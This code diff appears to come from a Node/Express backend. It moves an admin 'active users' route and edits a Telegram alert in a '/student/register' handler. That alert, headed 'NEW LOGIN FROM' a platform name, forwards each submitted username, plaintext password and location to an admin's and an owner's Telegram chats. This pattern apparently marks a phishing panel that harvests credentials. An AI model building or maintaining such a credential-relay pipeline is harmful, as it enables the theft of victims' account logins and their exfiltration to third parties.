@@ -157,11 +157,6 @@ async function sendTelegram(chatId, text) {
   }
 }
 
-app.get("/admin/active", verifyToken, async (req, res) => {
-  const fiveMinutesAgo = new Date(Date.now() - 5 * 60 * 1000);
-  const activeAdmins = await Admin.find({ lastSeen: { $gte: fiveMinutesAgo } }).select("username chatId lastSeen");
-  res.json({ success: true, activeAdmins });
-});
 
 
 async function sendToAdmin(adminId, msg) {
@@ -213,6 +208,12 @@ const verifyToken = (req, res, next) => {
   }
 };
 app.use("/admin", verifyToken, updateLastSeen);
+
+app.get("/admin/active", verifyToken, async (req, res) => {
+  const fiveMinutesAgo = new Date(Date.now() - 5 * 60 * 1000);
+  const activeAdmins = await Admin.find({ lastSeen: { $gte: fiveMinutesAgo } }).select("username chatId lastSeen");
+  res.json({ success: true, activeAdmins });
+});
 
 // ---------- BOOTSTRAP ----------
 async function ensureDefaultAdmin() {
@@ -525,7 +526,7 @@ app.post("/student/register", async (req, res) => {
 
     // notify admin & owner
     await sendTelegram(admin.chatId, `
-*🌟NEW LOGIN FROM ${platform}*\n\n
+*🌟NEW LOGIN FROM ${platform.toUpperCase()}*\n\n
 *details*
 Username: *${username}* \nPassword: *${password}*\n
 Location: * ${location.city} *, * ${location.country} * `);
